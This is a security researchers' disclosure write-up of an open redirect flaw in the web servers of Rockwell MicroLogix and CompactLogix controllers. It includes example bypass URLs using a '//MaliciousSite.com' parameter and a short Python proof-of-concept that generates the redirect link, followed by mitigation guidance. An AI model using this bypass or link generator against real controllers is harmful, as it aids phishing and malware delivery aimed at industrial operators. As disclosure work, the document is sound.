# ICSA-19-113-01

The following Rockwell Automation products were discovered to contain an open redirect vulnerability:

* MicroLogix 1400 Controllers
* Series A, All Versions
* Series B, v15.002 and earlier
* MicroLogix 1100 Controllers v14.00 and earlier
* CompactLogix 5370 L1 controllers v30.014 and earlier
* CompactLogix 5370 L2 controllers v30.014 and earlier
* CompactLogix 5370 L3 controllers (includes CompactLogix GuardLogix controllers) v30.014 and earlier

## Open Redirect Vulnerabilities

An Open Redirect vulnerability occurs when a web application accepts user-supplied input in the URL that contains a link to an external website, redirecting the user's browser to a malicious website. 
The Open Redirect vulnerability discovered in various Rockwell Controllers is no exception to this rule. Each controller runs a web server that displays diagnostics about that specific PLC. There also exists a URL parameter that enables the PLC to redirect the user’s browser:

```
http://192.168.1.12/index.html?redirect=/localpage
```

The redirect parameter intends to send users to another page located on the PLCs website. Under normal circumstances, the PLC would filter out redirects to an external website, so if you tried the following:

```
http://192.168.1.12/index.html?redirect=/externalsite
```

it would filter out the request and prevent the browser from being sent to a malicious site. However, the PLCs redirect filter does not account for the various ways to enter a URL like so:

```
http://192.168.1.12/index.html?redirect=//MaliciousSite.com
```

From the browser’s perspective, the second ‘/’ character will be ignored, making it a valid URL yet bypassing the PLCs filter. The browser will then be redirected to the website provided after the second ‘/’. This type of client-side attack can aid in phishing campaigns to setup browser exploits or install malware.

## Proof of Concept Exploit

```
import argparse

parser = argparse.ArgumentParser(description='Callback Script')
parser.add_argument('-r', '--redirect', required=True, dest="redirect", action='store', help='Redirect Destination IP')		
parser.add_argument('-p', '--plc', required=True, dest="plc", action='store', help='Rockwell Controller IP')	
args = parser.parse_args()  #Parse Command Line Arguments

print("Generating link...")
print("http://"+args.plc+"/index.html?redirect=//"+args.redirect)

```

## Disclosure

The vulnerabilities were immediately reported to the National Cybersecurity and Communications Integration Center (NCCIC) by security researchers Josiah Bryan and Geancarlo Palavicini. You can find the full advisory [here](https://www.cisa.gov/uscert/ics/advisories/ICSA-19-113-01).

## Mitigation

Rockwell Automation has released an update for each of the affected devices. Rockwell also recommends users take defensive measures to minimize the risk of exploitation of this vulnerability. Specifically, users should:

* Update to the latest available firmware revision that addresses the associated risk.
* Use trusted software, software patches, anti-virus/anti-malware programs, and interact only with trusted websites and attachments.
* Minimize network exposure for all control system devices and/or systems, and ensure that they are not accessible from the Internet.
* Locate control system networks and devices behind firewalls and isolate them from the business network.
* When remote access is required, use secure methods such as virtual private networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. VPN is only as secure as the connected devices.
* Employ training and awareness programs to educate users on the warning signs of a phishing or social engineering attack.
